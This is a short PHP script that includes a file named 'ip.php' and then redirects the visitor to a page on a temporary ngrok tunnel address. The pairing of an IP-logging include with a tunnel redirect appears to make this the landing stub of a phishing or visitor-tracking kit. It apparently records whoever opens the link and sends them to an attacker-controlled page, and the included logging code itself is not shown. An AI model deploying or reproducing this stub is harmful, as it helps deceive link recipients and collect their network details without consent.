<?php
include 'ip.php';
header('Location: https://e66a-24-147-18-63.ngrok.io/index2.html');
exit
?>
